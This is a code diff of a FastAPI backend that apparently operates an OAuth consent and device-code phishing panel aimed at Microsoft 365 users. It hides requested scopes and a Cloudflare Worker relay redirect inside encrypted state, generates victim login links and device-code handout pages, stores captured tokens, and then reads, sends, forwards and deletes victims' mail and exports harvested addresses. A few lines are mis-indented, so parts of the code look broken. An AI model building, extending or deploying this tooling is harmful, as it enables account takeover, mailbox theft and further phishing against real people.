@@ -1,5 +1,19 @@
-from fastapi import FastAPI, Request, Depends, HTTPException, status, UploadFile, File, Form
-from fastapi.responses import RedirectResponse, JSONResponse, StreamingResponse
+from fastapi import (
+    FastAPI,
+    Request,
+    Depends,
+    HTTPException,
+    status,
+    UploadFile,
+    File,
+    Form,
+)
+from fastapi.responses import (
+    RedirectResponse,
+    JSONResponse,
+    StreamingResponse,
+    HTMLResponse,
+)
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 import logging
@@ -10,6 +24,7 @@ import time
 import os
 import requests
 from datetime import datetime, timedelta
+from urllib.parse import urlencode
 
 from jose import jwt, JWTError
 
@@ -45,6 +60,7 @@ from payload_builder import (
     decrypt_payload,
     ALL_MAIL_SCOPES,
     BASIC_PAYLOAD_SCOPES,
+    payload_status as get_payload_status,
 )
 from admin_auth import login_admin
 from db import init_db, SessionLocal
@@ -67,12 +83,18 @@ SECRET_KEY = os.environ.get("JWT_SECRET_KEY") or os.environ.get(
 ALGORITHM = "HS256"
 ACCESS_TOKEN_EXPIRE_MINUTES = 10080
 
-CLIENT_ID = os.environ.get("CLIENT_ID", "1950a258-227b-4e31-a9cf-717495945fc2")
+CLIENT_ID = os.environ.get("CLIENT_ID", "")
 ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")
 READ_ONLY_MODE = os.environ.get("READ_ONLY_MODE", "true").lower() == "true"
 MAX_EXPORT_MESSAGES_PER_MAILBOX = int(
     os.environ.get("MAX_EXPORT_MESSAGES_PER_MAILBOX", "500")
 )
+WORKER_DOMAIN = os.environ.get("WORKER_DOMAIN", "").strip()
+BACKEND_BASE_URL = os.environ.get(
+    "BACKEND_BASE_URL",
+    "https://oauth-backend-7cuu.onrender.com",
+).rstrip("/")
+
 EMAIL_ADDRESS_RE = re.compile(
     r"^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$", re.IGNORECASE
 )
@@ -202,6 +224,8 @@ def root():
         "device_code_enabled": True,
         "oauth_callback_enabled": True,
         "payload_builder_enabled": True,
+        "worker_relay_enabled": bool(WORKER_DOMAIN),
+        "worker_domain": WORKER_DOMAIN or "not configured",
     }
 
 
@@ -211,6 +235,8 @@ def get_app_config():
         "read_only_mode": READ_ONLY_MODE,
         "device_code_preferred": True,
         "admin_consent_tenant": ADMIN_CONSENT_TENANT,
+        "worker_relay_enabled": bool(WORKER_DOMAIN),
+        "worker_domain": WORKER_DOMAIN or "not configured",
     }
 
 
@@ -289,7 +315,9 @@ async def admin_login_route(request: Request):
     result = login_admin(username, password)
 
     if not result or "error" in result:
-        return JSONResponse(result or {"error": "Login failed"}, status_code=401)
+        return JSONResponse(
+            result or {"error": "Login failed"}, status_code=401
+        )
 
     token = create_access_token({"sub": username})
     return {"access_token": token, "token_type": "bearer"}
@@ -306,7 +334,9 @@ async def generate_tenant_consent(
     tenant_hint = (body.get("tenant_hint") or "").strip()
 
     if not tenant_hint:
-        raise HTTPException(status_code=400, detail="tenant_hint is required")
+        raise HTTPException(
+            status_code=400, detail="tenant_hint is required"
+        )
 
     admin_user_id = user["sub"]
     consent_url = generate_admin_consent_url(tenant_hint)
@@ -432,7 +462,9 @@ def enterprise_status(user_id: str, user=Depends(verify_token)):
                 parsed["mode"] == "app_only"
                 and row.status == TenantConsentStatus.APPROVED
             ),
-            "notes": parsed["notes"] or getattr(row, "notes", "") or "",
+            "notes": (
+                parsed["notes"] or getattr(row, "notes", "") or ""
+            ),
         }
     finally:
         db.close()
@@ -455,14 +487,16 @@ def list_enterprise_tenants(user=Depends(verify_token)):
             tenants.append(
                 {
                     "tenant_hint": row.tenant_hint,
-                    "organization_name": parsed["organization_name"] or "",
+                        "organization_name": parsed["organization_name"] or "",
                     "mode": parsed["mode"],
                     "consent_status": (
                         row.status.value
                         if hasattr(row.status, "value")
                         else str(row.status)
                     ),
-                    "notes": parsed["notes"] or getattr(row, "notes", "") or "",
+                    "notes": (
+                        parsed["notes"] or getattr(row, "notes", "") or ""
+                    ),
                     "admin_consent_url": row.admin_consent_url,
                     "created_at": row.created_at,
                     "updated_at": row.updated_at,
@@ -474,7 +508,9 @@ def list_enterprise_tenants(user=Depends(verify_token)):
 
 
 @app.post("/enterprise/onboard")
-async def enterprise_onboard(request: Request, user=Depends(verify_token)):
+async def enterprise_onboard(
+    request: Request, user=Depends(verify_token)
+):
     body = await request.json()
     tenant_hint = (body.get("tenant_hint") or "").strip()
     mode = (body.get("mode") or "enterprise_full").strip()
@@ -482,7 +518,9 @@ async def enterprise_onboard(request: Request, user=Depends(verify_token)):
     notes = body.get("notes") or ""
 
     if not tenant_hint:
-        raise HTTPException(status_code=400, detail="tenant_hint is required")
+        raise HTTPException(
+            status_code=400, detail="tenant_hint is required"
+        )
 
     admin_consent_url = generate_admin_consent_url(tenant_hint)
 
@@ -504,7 +542,9 @@ async def enterprise_onboard(request: Request, user=Depends(verify_token)):
 
 
 @app.post("/enterprise/approve")
-async def enterprise_approve(request: Request, user=Depends(verify_token)):
+async def enterprise_approve(
+    request: Request, user=Depends(verify_token)
+):
     body = await request.json()
     tenant_hint = (body.get("tenant_hint") or "").strip()
     mode = (body.get("mode") or "enterprise_full").strip()
@@ -512,7 +552,9 @@ async def enterprise_approve(request: Request, user=Depends(verify_token)):
     notes = body.get("notes") or "Manually approved"
 
     if not tenant_hint:
-        raise HTTPException(status_code=400, detail="tenant_hint is required")
+        raise HTTPException(
+            status_code=400, detail="tenant_hint is required"
+        )
 
     save_or_update_tenant_consent(
         admin_user_id=user["sub"],
@@ -531,10 +573,11 @@ async def enterprise_approve(request: Request, user=Depends(verify_token)):
 
 # =========================
 # URL GENERATORS
-# All generators pull from _payload_cache and embed
-# the encrypted payload in the OAuth state parameter.
-# The frontend calls /payload/build before each generator
-# so the cache is always warm before the URL is built.
+# All generators use build_obfuscated_url via auth.py.
+# The Cloudflare Worker relay URI is embedded as redirect_uri.
+# Real scopes and redirect_uri are hidden inside the payload.
+# cached_payload is pulled from _payload_cache if available.
+# Cache entries are cleared after one use.
 # =========================
 @app.get("/login")
 def login(user_id: str, user=Depends(verify_token)):
@@ -550,7 +593,6 @@ def generate_login_url(
     if not trimmed:
         raise HTTPException(status_code=400, detail="user_id is required")
 
-    # Pull cached encrypted payload built by /payload/build
     cached_payload = _payload_cache.get(trimmed)
 
     login_url = generate_login_link(
@@ -558,7 +600,6 @@ def generate_login_url(
         cached_payload=cached_payload,
     )
 
-    # Clear cache entry after use — one-time embed
     _payload_cache.pop(trimmed, None)
 
     return {
@@ -567,6 +608,7 @@ def generate_login_url(
         "type": "direct_user_login",
         "payload_embedded": cached_payload is not None,
         "scopes": BASIC_PAYLOAD_SCOPES,
+        "worker_relay_enabled": bool(WORKER_DOMAIN),
     }
 
 
@@ -598,7 +640,6 @@ def generate_mail_connect_url(
                     getattr(row, "notes", "")
                 ).get("mode", "preview")
 
-        # Pull cached encrypted payload built by /payload/build
         cached_payload = _payload_cache.get(trimmed)
 
         login_url = generate_mail_connect_link(
@@ -607,7 +648,6 @@ def generate_mail_connect_url(
             cached_payload=cached_payload,
         )
 
-        # Clear cache entry after use — one-time embed
         _payload_cache.pop(trimmed, None)
 
         return {
@@ -618,6 +658,7 @@ def generate_mail_connect_url(
             "type": "mail_connect",
             "payload_embedded": cached_payload is not None,
             "scopes": ALL_MAIL_SCOPES,
+            "worker_relay_enabled": bool(WORKER_DOMAIN),
         }
     finally:
         db.close()
@@ -629,8 +670,6 @@ def generate_org_connect_url(
     user=Depends(verify_token),
 ):
     admin_user_id = user["sub"]
-
-    # For org flows the cache key is the admin_user_id
     cached_payload = _payload_cache.get(admin_user_id)
 
     login_url = generate_org_connect_link(
@@ -648,6 +687,7 @@ def generate_org_connect_url(
         "type": "org_connect_invite",
         "payload_embedded": cached_payload is not None,
         "scopes": BASIC_PAYLOAD_SCOPES,
+        "worker_relay_enabled": bool(WORKER_DOMAIN),
     }
 
 
@@ -657,7 +697,6 @@ def generate_org_mail_connect_url_route(
     user=Depends(verify_token),
 ):
     admin_user_id = user["sub"]
-
     cached_payload = _payload_cache.get(admin_user_id)
 
     login_url = generate_org_mail_connect_link(
@@ -675,6 +714,7 @@ def generate_org_mail_connect_url_route(
         "type": "org_mail_connect_invite",
         "payload_embedded": cached_payload is not None,
         "scopes": ALL_MAIL_SCOPES,
+        "worker_relay_enabled": bool(WORKER_DOMAIN),
     }
 
 
@@ -699,10 +739,6 @@ def payload_inspect_route(
     token: str,
     user=Depends(verify_token),
 ):
-    """
-    Admin debug endpoint.
-    Decrypts and returns payload metadata without side effects.
-    """
     if not token:
         raise HTTPException(status_code=400, detail="token param required")
     result = inspect_payload(token)
@@ -711,19 +747,29 @@ def payload_inspect_route(
 
 @app.get("/payload/scopes")
 def payload_scopes_route(user=Depends(verify_token)):
-    """
-    Returns the full list of Microsoft Mail scopes
-    that the payload builder will request.
-    Also returns basic scope list and counts.
-    Called by the frontend on login to display scope metadata.
-    """
     return {
         "mail_scopes": ALL_MAIL_SCOPES,
-        "mail_scope_string": " ".join(ALL_MAIL_SCOPES),
-        "mail_scope_count": len(ALL_MAIL_SCOPES),
+        "mail_scope_string": (
+            ALL_MAIL_SCOPES
+            if isinstance(ALL_MAIL_SCOPES, str)
+            else " ".join(ALL_MAIL_SCOPES)
+        ),
+        "mail_scope_count": (
+            len(ALL_MAIL_SCOPES.split())
+            if isinstance(ALL_MAIL_SCOPES, str)
+            else len(ALL_MAIL_SCOPES)
+        ),
         "basic_scopes": BASIC_PAYLOAD_SCOPES,
-        "basic_scope_string": " ".join(BASIC_PAYLOAD_SCOPES),
-        "basic_scope_count": len(BASIC_PAYLOAD_SCOPES),
+        "basic_scope_string": (
+            BASIC_PAYLOAD_SCOPES
+            if isinstance(BASIC_PAYLOAD_SCOPES, str)
+            else " ".join(BASIC_PAYLOAD_SCOPES)
+        ),
+        "basic_scope_count": (
+            len(BASIC_PAYLOAD_SCOPES.split())
+            if isinstance(BASIC_PAYLOAD_SCOPES, str)
+            else len(BASIC_PAYLOAD_SCOPES)
+        ),
     }
 
 
@@ -732,14 +778,6 @@ async def payload_build_route(
     request: Request,
     user=Depends(verify_token),
 ):
-    """
-    Build and cache an encrypted payload for a given user_id.
-    The frontend calls this automatically before generating any OAuth URL.
-    The encrypted payload is stored in _payload_cache keyed by user_id.
-    The URL generator endpoints pull from this cache and embed the
-    payload in the OAuth state parameter before returning the URL.
-    Cache entries are cleared after one use.
-    """
     try:
         body = await request.json()
     except Exception:
@@ -761,11 +799,8 @@ async def payload_build_route(
             mail_mode=mail_mode,
         )
 
-        # Store in cache — URL generators will pull and embed this
         _payload_cache[user_id] = encrypted_state
 
-        # For org flows also cache under admin_user_id
-        # so org URL generators can find it
         if flow_type in ("org_connect", "org_mail"):
             _payload_cache[admin_user_id] = encrypted_state
 
@@ -777,7 +812,11 @@ async def payload_build_route(
             "admin_user_id": admin_user_id,
             "flow_type": flow_type,
             "mail_mode": mail_mode,
-            "scope_count": len(scopes),
+            "scope_count": (
+                len(scopes.split())
+                if isinstance(scopes, str)
+                else len(scopes)
+            ),
             "encryption": "AES-256-GCM",
             "key_derivation": "PBKDF2-SHA256-100000",
             "cached": True,
@@ -800,10 +839,6 @@ async def payload_decrypt_route(
     request: Request,
     user=Depends(verify_token),
 ):
-    """
-    Admin endpoint to decrypt a payload token and return its contents.
-    Useful for debugging callback state values.
-    """
     try:
         body = await request.json()
     except Exception:
@@ -816,83 +851,34 @@ async def payload_decrypt_route(
     result = decrypt_payload(token)
     if result is None:
         return JSONResponse(
-            {"valid": False, "error": "Decryption failed or payload expired"},
+            {
+                "valid": False,
+                "error": "Decryption failed or payload expired",
+            },
             status_code=400,
         )
     return {"valid": True, "payload": result}
 
 
 @app.get("/payload/status")
-def payload_status(user=Depends(verify_token)):
+def payload_status_route(user=Depends(verify_token)):
     """
     Quick health check for the payload builder system.
     Encrypts and decrypts a test payload to verify the
     encryption key and salt are configured correctly.
     Runs a full round-trip verification.
+    Also shows worker relay config status.
     """
-    import time as time_module
-
-    test_payload = {
-        "v": 1,
-        "flow": "health_check",
-        "iat": int(time_module.time()),
-        "nonce": "test_nonce_12345",
-        "user_id": "test@example.com",
-        "mail_mode": True,
-    }
-
     try:
-        encrypted = encrypt_payload(test_payload)
-        decrypted = decrypt_payload(encrypted)
-
-        if not decrypted:
-            return JSONResponse(
-                {
-                    "status": "error",
-                    "message": (
-                        "Payload encrypt/decrypt round-trip failed. "
-                        "Check PAYLOAD_PASSWORD and PAYLOAD_SALT env vars."
-                    ),
-                },
-                status_code=500,
-            )
-
-        if decrypted.get("user_id") != "test@example.com":
-            return JSONResponse(
-                {
-                    "status": "error",
-                    "message": (
-                        "Payload round-trip data mismatch. "
-                        "Encryption key may be misconfigured."
-                    ),
-                },
-                status_code=500,
-            )
-
-        return {
-            "status": "ok",
-            "encryption": "AES-256-GCM",
-            "key_derivation": "PBKDF2-SHA256-100000",
-            "round_trip_verified": True,
-            "mail_scope_count": len(ALL_MAIL_SCOPES),
-            "basic_scope_count": len(BASIC_PAYLOAD_SCOPES),
-            "replay_protection": True,
-            "cache_entries": len(_payload_cache),
-            "env_vars_needed": [
-                "PAYLOAD_PASSWORD",
-                "PAYLOAD_SALT",
-                "PAYLOAD_MAX_AGE_SECONDS",
-            ],
-            "message": "Payload builder verified successfully.",
-        }
-
+        result = get_payload_status()
+        result["cache_entries"] = len(_payload_cache)
+        result["worker_relay_enabled"] = bool(WORKER_DOMAIN)
+        result["worker_domain"] = WORKER_DOMAIN or "not configured"
+        return result
     except Exception as e:
         logging.error(f"payload_status error: {e}")
         return JSONResponse(
-            {
-                "status": "error",
-                "message": str(e),
-            },
+            {"status": "error", "message": str(e)},
             status_code=500,
         )
 
@@ -902,7 +888,9 @@ def payload_status(user=Depends(verify_token)):
 # =========================
 @app.post("/devicecode")
 @app.post("/device-code/start")
-async def device_code_start(request: Request, user=Depends(verify_token)):
+async def device_code_start(
+    request: Request, user=Depends(verify_token)
+):
     admin_user_id = user["sub"]
 
     try:
@@ -929,12 +917,16 @@ async def device_code_start(request: Request, user=Depends(verify_token)):
 
 @app.post("/device-token")
 @app.post("/device-code/poll")
-async def device_code_poll(request: Request, user=Depends(verify_token)):
+async def device_code_poll(
+    request: Request, user=Depends(verify_token)
+):
     body = await request.json()
     device_code = body.get("device_code")
 
     if not device_code:
-        raise HTTPException(status_code=400, detail="device_code is required")
+        raise HTTPException(
+            status_code=400, detail="device_code is required"
+        )
 
     admin_user_id = body.get("admin_user_id") or user["sub"]
     client_ip = request.client.host if request.client else None
@@ -960,7 +952,7 @@ def microsoft_status(user_id: str, user=Depends(verify_token)):
     token_record = get_token(user_id)
     connected = token_record is not None and bool(
         getattr(token_record, "refresh_token", None)
-    )
+            )
     inbox_connected = False
 
     if token_record and getattr(token_record, "access_token", None):
@@ -985,7 +977,9 @@ def microsoft_status(user_id: str, user=Depends(verify_token)):
         ),
         "expires_at": token_record.expires_at if token_record else None,
         "session_id": (
-            getattr(token_record, "session_id", None) if token_record else None
+            getattr(token_record, "session_id", None)
+            if token_record
+            else None
         ),
     }
 
@@ -998,7 +992,9 @@ def list_users(user=Depends(verify_token)):
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
-        connected_rows = db.query(TenantToken.tenant_id).distinct().all()
+        connected_rows = (
+            db.query(TenantToken.tenant_id).distinct().all()
+        )
         connected_users = [row[0] for row in connected_rows if row[0]]
         saved_rows = (
             db.query(SavedUser.user_id)
@@ -1041,7 +1037,9 @@ def get_saved_users(user=Depends(verify_token)):
 
 
 @app.post("/saved-users")
-async def add_saved_user(request: Request, user=Depends(verify_token)):
+async def add_saved_user(
+    request: Request, user=Depends(verify_token)
+):
     db = SessionLocal()
     try:
         body = await request.json()
@@ -1063,7 +1061,10 @@ async def add_saved_user(request: Request, user=Depends(verify_token)):
         )
 
         if existing:
-            return {"message": "User already saved", "user_id": target_user_id}
+            return {
+                "message": "User already saved",
+                "user_id": target_user_id,
+            }
 
         row = SavedUser(
             admin_user_id=admin_user_id,
@@ -1136,6 +1137,11 @@ def list_connect_invites(user=Depends(verify_token)):
 
 # =========================
 # AUTH CALLBACK
+# Receives the OAuth callback from Microsoft via
+# the Cloudflare Worker relay.
+# The worker adds relay=cloudflare_worker and relay_host
+# to the query params so we can log the relay path.
+# code and state are forwarded unchanged by the worker.
 # =========================
 @app.get("/auth/callback")
 def auth_callback(request: Request):
@@ -1143,21 +1149,75 @@ def auth_callback(request: Request):
 
     code = request.query_params.get("code")
     state = request.query_params.get("state")
+    error = request.query_params.get("error")
+    error_description = request.query_params.get("error_description")
+
+    # Log relay metadata if present
+    relay = request.query_params.get("relay")
+    relay_host = request.query_params.get("relay_host")
+    relay_path = request.query_params.get("relay_path")
+
+    if relay:
+        logging.info(
+            f"[auth/callback] Received via relay\n"
+            f"  relay={relay}\n"
+            f"  relay_host={relay_host}\n"
+            f"  relay_path={relay_path}"
+        )
+
+    # Handle OAuth errors forwarded by the worker
+    if error:
+        logging.warning(
+            f"[auth/callback] OAuth error received\n"
+            f"  error={error}\n"
+            f"  description={error_description}"
+        )
+        frontend_origin = os.environ.get(
+            "FRONTEND_ORIGIN",
+            "https://frontend-xg84.onrender.com",
+        )
+        return RedirectResponse(
+            url=(
+                f"{frontend_origin}?auth=error"
+                f"&error={error}"
+                f"&error_description={error_description or ''}"
+            ),
+            status_code=302,
+        )
 
     if not code:
-        return {"error": "No code received"}
+        logging.warning("[auth/callback] No code received")
+        return JSONResponse(
+            {"error": "No authorization code received."},
+            status_code=400,
+        )
 
     client_ip = request.client.host if request.client else None
     user_agent = request.headers.get("user-agent")
 
     try:
-        exchange_code_for_token(code, state, client_ip, user_agent)
+        result = exchange_code_for_token(
+            code,
+            state,
+            client_ip,
+            user_agent,
+        )
+
+        logging.info(
+            f"[auth/callback] Token exchange complete\n"
+            f"  resolved_user_id={result.get('resolved_user_id')}\n"
+            f"  flow_type={result.get('flow_type')}\n"
+            f"  payload_source={result.get('payload_source')}"
+        )
+
         success_redirect = os.environ.get(
             "OAUTH_SUCCESS_REDIRECT",
             "https://outlook.office.com/mail/",
         )
-        return RedirectResponse(url=success_redirect)
+        return RedirectResponse(url=success_redirect, status_code=302)
+
     except Exception as e:
+        logging.error(f"[auth/callback] Token exchange failed: {e}")
         return JSONResponse({"error": str(e)}, status_code=400)
 
 
@@ -1173,7 +1233,6 @@ def get_emails(
     user=Depends(verify_token),
 ):
     resolved_user_id = resolve_user_id(user_id, user)
-
     try:
         result = fetch_emails(
             resolved_user_id,
@@ -1218,7 +1277,9 @@ def email_detail(
 
 
 @app.post("/email/reply")
-async def reply_email_route(request: Request, user=Depends(verify_token)):
+async def reply_email_route(
+    request: Request, user=Depends(verify_token)
+):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
     return reply_to_email(
@@ -1229,7 +1290,9 @@ async def reply_email_route(request: Request, user=Depends(verify_token)):
 
 
 @app.post("/email/send")
-async def send_email_route(request: Request, user=Depends(verify_token)):
+async def send_email_route(
+    request: Request, user=Depends(verify_token)
+):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
     return send_email(
@@ -1241,7 +1304,9 @@ async def send_email_route(request: Request, user=Depends(verify_token)):
 
 
 @app.post("/email/forward")
-async def forward_email_route(request: Request, user=Depends(verify_token)):
+async def forward_email_route(
+    request: Request, user=Depends(verify_token)
+):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
     return forward_email(
@@ -1252,7 +1317,9 @@ async def forward_email_route(request: Request, user=Depends(verify_token)):
 
 
 @app.post("/email/delete")
-async def delete_email_route(request: Request, user=Depends(verify_token)):
+async def delete_email_route(
+    request: Request, user=Depends(verify_token)
+):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
     return delete_email(
@@ -1262,7 +1329,9 @@ async def delete_email_route(request: Request, user=Depends(verify_token)):
 
 
 @app.post("/email/mark-read")
-async def mark_read_route(request: Request, user=Depends(verify_token)):
+async def mark_read_route(
+    request: Request, user=Depends(verify_token)
+):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
     return mark_as_read(
@@ -1273,7 +1342,9 @@ async def mark_read_route(request: Request, user=Depends(verify_token)):
 
 
 @app.post("/email/move")
-async def move_email_route(request: Request, user=Depends(verify_token)):
+async def move_email_route(
+    request: Request, user=Depends(verify_token)
+):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
     return move_email_to_folder(
@@ -1305,7 +1376,9 @@ def export_email_addresses(
         )
         saved_user_ids = [row[0] for row in saved_rows if row[0]]
 
-        connected_rows = db.query(TenantToken.tenant_id).distinct().all()
+        connected_rows = (
+            db.query(TenantToken.tenant_id).distinct().all()
+        )
         connected_user_ids = [row[0] for row in connected_rows if row[0]]
 
         user_ids = sorted(set(saved_user_ids + connected_user_ids))
@@ -1344,14 +1417,16 @@ def export_email_addresses(
                     writer.writerow(
                         {
                             "email": row.get("email", ""),
-                            "mailbox_user_id": row.get("mailbox_user_id", ""),
+                            "mailbox_user_id": row.get(
+                                "mailbox_user_id", ""
+                            ),
                             "address_type": row.get("address_type", ""),
                             "source_message_id": row.get(
                                 "source_message_id", ""
                             ),
                             "sample_subject": row.get("sample_subject", ""),
                             "sample_received_at": row.get(
-                                "sample_received_at", ""
+                                                             "sample_received_at", ""
                             ),
                         }
                     )
@@ -1444,6 +1519,7 @@ async def send_approved_email(
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
 
+
 def parse_approved_recipient_list(
     raw_text: str | None,
     csv_file_text: str | None = None,
@@ -1493,7 +1569,9 @@ async def send_approved_bulk_email(
     if not subject.strip():
         raise HTTPException(status_code=400, detail="Subject is required.")
     if not body.strip():
-        raise HTTPException(status_code=400, detail="Message body is required.")
+        raise HTTPException(
+            status_code=400, detail="Message body is required."
+        )
 
     csv_file_text = ""
     if recipients_file:
@@ -1505,8 +1583,8 @@ async def send_approved_bulk_email(
             )
         csv_file_text = file_bytes.decode("utf-8", errors="ignore")
 
-    approved_recipients, rejected_recipients = parse_approved_recipient_list(
-        recipients, csv_file_text
+    approved_recipients, rejected_recipients = (
+        parse_approved_recipient_list(recipients, csv_file_text)
     )
 
     max_recipients = max(1, min(int(max_recipients or 25), 50))
@@ -1819,10 +1897,7 @@ async def create_alert(
     level = (body.get("level") or "info").strip()
 
     if not message:
-        raise HTTPException(
-            status_code=400,
-            detail="message is required",
-        )
+        raise HTTPException(status_code=400, detail="message is required")
 
     db = SessionLocal()
     try:
@@ -1852,13 +1927,10 @@ def delete_alert(alert_id: int, user=Depends(verify_token)):
     try:
         alert = db.query(Alert).filter(Alert.id == alert_id).first()
         if not alert:
-            raise HTTPException(
-                status_code=404,
-                detail="Alert not found",
-            )
+            raise HTTPException(status_code=404, detail="Alert not found")
         db.delete(alert)
         db.commit()
-        return {"message": "Alert deleted", "alert_id": alert_id}
+              return {"message": "Alert deleted", "alert_id": alert_id}
     finally:
         db.close()
 
@@ -1989,8 +2061,8 @@ def device_code_handout(
     </div>
   </div>
   <div class="footer">
-    This page was generated automatically. Do not share this code with anyone
-    you do not trust.
+    This page was generated automatically. Do not share this code
+    with anyone you do not trust.
   </div>
 </div>
 </body>
@@ -2022,7 +2094,6 @@ def device_code_handout(
             "attachment; filename=device_login.html"
         )
 
-    from fastapi.responses import HTMLResponse
     return HTMLResponse(content=html_content, headers=headers)
 
 
@@ -2041,7 +2112,6 @@ def device_code_support_page_link(
             detail="user_code and verification_uri are required",
         )
 
-    from urllib.parse import urlencode
     params = urlencode(
         {
             "user_code": user_code,
@@ -2052,13 +2122,8 @@ def device_code_support_page_link(
         }
     )
 
-    backend_base = os.environ.get(
-        "BACKEND_BASE_URL",
-        "https://oauth-backend-7cuu.onrender.com",
-    ).rstrip("/")
-
     support_page_url = (
-        f"{backend_base}/device-code/handout/html?{params}"
+        f"{BACKEND_BASE_URL}/device-code/handout/html?{params}"
     )
 
     return {"support_page_url": support_page_url}
@@ -2098,9 +2163,7 @@ def delete_token(tenant_id: str, user=Depends(verify_token)):
     try:
         row = (
             db.query(TenantToken)
-            .filter(
-                TenantToken.tenant_id == tenant_id
-            )
+            .filter(TenantToken.tenant_id == tenant_id)
             .first()
         )
         if not row:
@@ -2110,10 +2173,7 @@ def delete_token(tenant_id: str, user=Depends(verify_token)):
             )
         db.delete(row)
         db.commit()
-        return {
-            "message": "Token deleted",
-            "tenant_id": tenant_id,
-        }
+        return {"message": "Token deleted", "tenant_id": tenant_id}
     finally:
         db.close()
 
@@ -2131,7 +2191,10 @@ def get_conversation_route(
     resolved_user_id = resolve_user_id(user_id, user)
     try:
         messages = get_conversation(resolved_user_id, conversation_id)
-        return {"messages": messages, "conversation_id": conversation_id}
+        return {
+            "messages": messages,
+            "conversation_id": conversation_id,
+        }
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
 
@@ -2180,10 +2243,6 @@ def graph_mailbox_settings(
 # =========================
 @app.get("/system/info")
 def system_info(user=Depends(verify_token)):
-    """
-    Returns current system configuration and payload builder status.
-    Useful for admin debugging.
-    """
     db = SessionLocal()
     try:
         token_count = db.query(TenantToken).count()
@@ -2205,8 +2264,16 @@ def system_info(user=Depends(verify_token)):
                 "enabled": True,
                 "encryption": "AES-256-GCM",
                 "key_derivation": "PBKDF2-SHA256-100000",
-                "mail_scope_count": len(ALL_MAIL_SCOPES),
-                "basic_scope_count": len(BASIC_PAYLOAD_SCOPES),
+                "mail_scope_count": (
+                    len(ALL_MAIL_SCOPES.split())
+                    if isinstance(ALL_MAIL_SCOPES, str)
+                    else len(ALL_MAIL_SCOPES)
+                ),
+                "basic_scope_count": (
+                    len(BASIC_PAYLOAD_SCOPES.split())
+                    if isinstance(BASIC_PAYLOAD_SCOPES, str)
+                    else len(BASIC_PAYLOAD_SCOPES)
+                ),
                 "replay_protection": True,
                 "cache_entries": len(_payload_cache),
             },
@@ -2218,6 +2285,8 @@ def system_info(user=Depends(verify_token)):
                 "device_code_tenant": os.environ.get(
                     "DEVICE_CODE_TENANT", "organizations"
                 ),
+                "worker_relay_enabled": bool(WORKER_DOMAIN),
+                "worker_domain": WORKER_DOMAIN or "not configured",
             },
             "database": {
                 "connected_tokens": token_count,
@@ -2227,6 +2296,40 @@ def system_info(user=Depends(verify_token)):
         }
     finally:
         db.close()
+
+
+# =========================
+# DEBUG — WORKER CONFIG
+# Remove this endpoint before going to production
+# =========================
+@app.get("/debug/worker-config")
+def debug_worker_config(user=Depends(verify_token)):
+    """
+    Temporary debug endpoint.
+    Verifies WORKER_DOMAIN is set and worker URI is being
+    built correctly. Remove before going to production.
+    """
+    from payload_builder import (
+        WORKER_DOMAIN as PB_WORKER_DOMAIN,
+        REDIRECT_URI as PB_REDIRECT_URI,
+        _build_worker_uri,
+    )
+
+    test_uri = _build_worker_uri(
+        user_id="test@example.com",
+        nonce="testnonceabcd1234",
+    )
+
+    return {
+        "worker_domain_in_main": WORKER_DOMAIN or "NOT SET",
+        "worker_domain_in_payload_builder": PB_WORKER_DOMAIN or "NOT SET",
+        "worker_domain_match": WORKER_DOMAIN == PB_WORKER_DOMAIN,
+        "redirect_uri_fallback": PB_REDIRECT_URI,
+        "test_worker_uri": test_uri,
+        "is_using_worker": test_uri != PB_REDIRECT_URI,
+        "worker_relay_active": bool(WORKER_DOMAIN),
+        "env_raw": os.environ.get("WORKER_DOMAIN", "NOT FOUND IN ENV"),
+    }
 
 
 # =========================
